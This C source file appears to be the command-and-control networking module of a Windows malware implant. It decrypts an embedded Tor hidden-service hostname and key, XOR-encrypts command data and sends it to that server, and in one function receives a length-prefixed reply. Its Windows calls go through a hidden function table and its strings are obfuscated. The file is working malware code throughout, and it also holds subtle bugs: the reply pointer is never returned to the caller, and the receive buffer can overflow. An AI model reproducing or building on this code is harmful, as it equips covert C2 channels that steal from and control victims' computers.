#include "global_config.h"

#include "connection.h"
#include "connection_tor.h"

#include "crypto.h"

#include <Windows.h>

#include "debug.h"

#define WIN32_LEAN_AND_MEAN



#include <winsock2.h>
#include <ws2tcpip.h>
#define MSG_NOSIGNAL 0


#include "functions_table.h"

#include <stdio.h>
#include <stdlib.h>

///////////////////////////////////////////////////////////////////
// network functions

// https://stackoverflow.com/questions/41198024/how-to-recv-until-theres-nothing-more-to-recv-without-eof
//
#define MAX_BUF 1024

bool init_socket(SOCKET* s)
{
    DBG_MSG("init_socket() - Started ... \n");

    *s = l_socket(AF_INET, SOCK_STREAM, 0);

    if (*s == INVALID_SOCKET) {
        DBG_MSG("init_socket() - l_socket() failed with error code %d\n", l_WSAGetLastError());
        return false;
    }

    DWORD timeout_value = SOCKET_SEND_RECV_DEFAULT_TIMEOUT;

    int ret = l_setsockopt(*s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_value, sizeof(timeout_value));

    if (ret == SOCKET_ERROR) {
        DBG_MSG("init_socket() - l_setsockopt() for SO_RCVTIMEO failed with error code %d\n", l_WSAGetLastError());

        return false;
    }

    ret = l_setsockopt(*s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_value, sizeof(timeout_value));

    if (ret == SOCKET_ERROR) {
        DBG_MSG("init_socket() - l_setsockopt() for SO_SNDTIMEO failed with error code %d\n", l_WSAGetLastError());

        return false;
    }

    //
    return true;
}

void de_init_socket(SOCKET* s)
{
    DBG_MSG("de_init_socket() called.\n");

    if ((*s != INVALID_SOCKET) && (*s != NULL))
    {
        l_closesocket(*s);
        *s = INVALID_SOCKET;
    }
}


char* recv_by_length_exactly(SOCKET s, unsigned int exact_length)
{
    DBG_MSG("recv_by_length_exactly() called, exact_length: %d", (DWORD)exact_length);

    char tmp_buffer[MAX_BUF];
    char* ret_string = (char*)calloc(exact_length, 1);
    int ret_string_len = 0;

    int nDataLength;
    int remain_len_to_recv;

    //
    while (ret_string_len < exact_length) {
        remain_len_to_recv = exact_length - ret_string_len;

        if (exact_length < MAX_BUF) {
            nDataLength = l_recv(s, tmp_buffer, remain_len_to_recv, 0);
        }
        else {
            nDataLength = l_recv(s, tmp_buffer, MAX_BUF, 0);
        }

        if (nDataLength == 0) {
            DBG_MSG("recv_by_length_exactly() failed. Connection is closed already. Return now.\n");

            //
            free(ret_string);
            return NULL;
        }


        if (nDataLength == SOCKET_ERROR) {
            DBG_MSG("recv_by_length_exactly() failed. error code: %d\n", l_WSAGetLastError());

            //
            free(ret_string);
            return NULL;
        }

        memcpy(ret_string + ret_string_len, tmp_buffer, nDataLength);

        ret_string_len += nDataLength;
    }

    // free it yourself
    return ret_string;
}


/*
Return values:
    -1 : error
    1: success
*/
int send_all(SOCKET socket, void* buffer, size_t length, int flags)
{
    DBG_MSG("send_all() called, length: %d", (DWORD)length);

    int n;

    char* p = (char*)buffer;

    //

    while (length > 0)
    {
        n = l_send(socket, p, length, flags);
        if (n <= 0)
            return -1;

        p += n;
        length -= n;
    }

    return 1;
}

//
///////////////////////////////////////////////////////////////////
//
//  see docs.txt for each command type.
///////////////////////////////////////////////////////////////////
/*
1. return:
    - true: on success
    - false: on false

*/
bool COMMAND_TYPE_1(int command_code, char* command_data, int command_data_len)
{
    DBG_MSG("COMMAND_TYPE_1() - Sending command with command_code: %d , command_data_len: %d\n", command_code, command_data_len);


    SOCKET socket = NULL;

    //
    bool ret_init_socket = init_socket(&socket);

    if (!ret_init_socket) {
        DBG_MSG("COMMAND_TYPE_1 failed - init_socket() failed. Return now. \n");

        de_init_socket(&socket);
        return false;
    }

    //
    char* tor_hostname = NULL;
    decrypt_to_string(&tor_hostname, TOR_HOSTNAME, TOR_HOSTNAME_ENCRYPTED_LEN);

    DBG_MSG("COMMAND_TYPE_1: tor_hostname: %s\n", tor_hostname);

    bool ret = connection_tor::init_tor_socket(tor_hostname, &socket);
    free(tor_hostname);

    if (!ret) {
        DBG_MSG("COMMAND_TYPE_1() - failed to init tor socket. Return now.\n");

        de_init_socket(&socket);
        return false;
    }
    //


    //
    // data_size = sizeof(command_code) + sizeof(command_data_len) + command_data_len
    int data_size = 2 * sizeof(int) + command_data_len;
    char* to_send_data = (char*)calloc(data_size, 1);

    //
    int* tmp = (int*)to_send_data;
    *tmp = command_code;

    //
    tmp = (int*)(to_send_data + sizeof(int));
    *tmp = command_data_len;

    //
    char* network_transmission_encryption_key = NULL;
    decrypt_to_string(&network_transmission_encryption_key, NETWORK_TRANSMISSION_ENCRYPTION_KEY, NETWORK_TRANSMISSION_ENCRYPTION_KEY_ENCRYPTED_LEN);

    DBG_MSG("COMMAND_TYPE_1: network_transmission_encryption_key: %s\n", network_transmission_encryption_key);

    //
    char* command_data_encrypted = xor_encrypt_decrypt(command_data, (char*)network_transmission_encryption_key, command_data_len);

    memcpy((PVOID)(to_send_data + 2 * sizeof(int)), command_data_encrypted, command_data_len);

    //
    free(network_transmission_encryption_key);
    free(command_data_encrypted);

    //
    int ret_send_all = send_all(socket, (PVOID)to_send_data, data_size, MSG_NOSIGNAL);

    if (ret_send_all == -1) {
        DBG_MSG("COMMAND_TYPE_1() - send_all() failed, error code: %d. Return now.\n", l_GetLastError());

        //
        free(to_send_data);
        de_init_socket(&socket);
        return false;
    }

    // dummy waitting for server to close.
    char resp[1];

    //
    l_recv(socket, resp, 1, 0);


    //
    DBG_MSG("COMMAND_TYPE_1() - Sending command with command_code: %d , command_data_len: %d  -  SUCCESS.\n", command_code, command_data_len);

    //
    free(to_send_data);
    de_init_socket(&socket);
    return true;
}

/*
1. return:
    - true: on success
    - false: on false

2. command result will be put back in:
    - command_respond
*/

bool COMMAND_TYPE_2(int command_code, char* command_data, int command_data_len, char* data_from_server, int* data_from_server_len)
{
    DBG_MSG("COMMAND_TYPE_2() - Sending command with command_code: %d , command_data_len: %d\n", command_code, command_data_len);

    SOCKET socket = NULL;

    //
    bool ret_init_socket = init_socket(&socket);

    if (!ret_init_socket) {
        DBG_MSG("COMMAND_TYPE_2 failed - init_socket() failed. Return now. \n");

        de_init_socket(&socket);
        return false;
    }

    //
    char* tor_hostname = NULL;
    decrypt_to_string(&tor_hostname, TOR_HOSTNAME, TOR_HOSTNAME_ENCRYPTED_LEN);

    DBG_MSG("COMMAND_TYPE_2: tor_hostname: %s\n", tor_hostname);

    bool ret = connection_tor::init_tor_socket(tor_hostname, &socket);
    free(tor_hostname);

    if (!ret) {
        DBG_MSG("COMMAND_TYPE_2() - failed to init tor socket. Return now.\n");

        de_init_socket(&socket);
        return false;
    }
    //

    //
    // data_size = sizeof(command_code) + sizeof(command_data_len) + command_data_len
    int data_size = 2 * sizeof(int) + command_data_len;
    char* to_send_data = (char*)calloc(data_size, 1);

    //
    int* tmp = (int*)to_send_data;
    *tmp = command_code;

    //
    tmp = (int*)(to_send_data + sizeof(int));
    *tmp = command_data_len;

    //
    char* network_transmission_encryption_key = NULL;
    decrypt_to_string(&network_transmission_encryption_key, NETWORK_TRANSMISSION_ENCRYPTION_KEY, NETWORK_TRANSMISSION_ENCRYPTION_KEY_ENCRYPTED_LEN);

    DBG_MSG("COMMAND_TYPE_2: network_transmission_encryption_key: %s\n", network_transmission_encryption_key);

    //
    char* command_data_encrypted = xor_encrypt_decrypt(command_data, (char*)network_transmission_encryption_key, command_data_len);

    memcpy((PVOID)(to_send_data + 2 * sizeof(int)), command_data_encrypted, command_data_len);

    //
    free(network_transmission_encryption_key);
    free(command_data_encrypted);

    //
    int ret_send_all = send_all(socket, (PVOID)to_send_data, data_size, MSG_NOSIGNAL);

    free(to_send_data);

    if (ret_send_all == -1) {
        DBG_MSG("COMMAND_TYPE_2() - send_all() failed, error code: %d. Return now.\n", l_GetLastError());

        de_init_socket(&socket);
        return false;
    }

    //
    char* recv_by_length_exactly_ptr = NULL;
    int recv_data_respond_size = 0;

    recv_by_length_exactly_ptr = recv_by_length_exactly(socket, 4);

    if (recv_by_length_exactly_ptr == NULL) {
        DBG_MSG("COMMAND_TYPE_2() - recv_by_length_exactly() failed. Return now.\n");

        de_init_socket(&socket);
        return false;
    }

    //
    recv_data_respond_size = *(int*)recv_by_length_exactly_ptr;
    free(recv_by_length_exactly_ptr);

    DBG_MSG("COMMAND_TYPE_2() - recv_data_respond_size: %d\n", recv_data_respond_size);

    // real data respond from server
    recv_by_length_exactly_ptr = recv_by_length_exactly(socket, recv_data_respond_size);

    if (recv_by_length_exactly_ptr == NULL) {
        DBG_MSG("connection_tor::init_tor_socket() - recv_by_length_exactly() failed. Return now.\n");

        de_init_socket(&socket);
        return false;
    }

    // TODO: return the 'real data respond from server', the processing of data should free the pointer by itself when the job done.
    data_from_server = recv_by_length_exactly_ptr;
    *data_from_server_len = recv_data_respond_size;

    //
    DBG_MSG("COMMAND_TYPE_2() - Sending command with command_code: %d , command_data_len: %d   - SUCCESS\n", command_code, command_data_len);


    // This is the result, free yourself in the caller of this function.
    // free(recv_by_length_exactly_ptr);

    //
    de_init_socket(&socket);
    return true;
}